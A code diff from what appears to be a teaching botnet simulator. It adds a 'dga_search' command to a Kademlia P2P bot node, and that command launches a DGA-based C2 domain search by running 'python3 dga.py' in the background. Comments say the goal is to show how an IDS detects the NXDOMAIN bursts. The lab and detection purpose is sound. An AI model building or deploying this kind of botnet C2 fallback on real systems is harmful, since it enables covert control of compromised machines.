@@ -1433,7 +1433,24 @@ static void execute_command(KademliaNode *n, const char *cmd_json) {
 
     } else if (strcmp(type, "idle") == 0) {
         printf("[P2P] -> Idle\n");
-
+ 
+    } else if (strcmp(type, "dga_search") == 0) {
+        /*
+         * Trigger a DGA-based C2 domain search (fallback channel demo).
+         *
+         * Spawns dga.py as a background subprocess — the burst of
+         * NXDOMAIN responses it generates is exactly what IDS Engine 3
+         * (Shannon entropy + NXDOMAIN burst counter) is designed to catch.
+         *
+         * Teaching point: even though the P2P mesh makes C2 takedowns
+         * hard, the DGA fallback reveals bot presence to a competent IDS
+         * via DNS traffic analysis.
+         *
+         * The command carries no extra fields — type is sufficient.
+         */
+        printf("[P2P] -> Triggering DGA C2 search (spawning dga.py)\n");
+        system("python3 dga.py &");
+ 
     } else {
         printf("[P2P] -> Unknown command type: %s\n", type);
     }
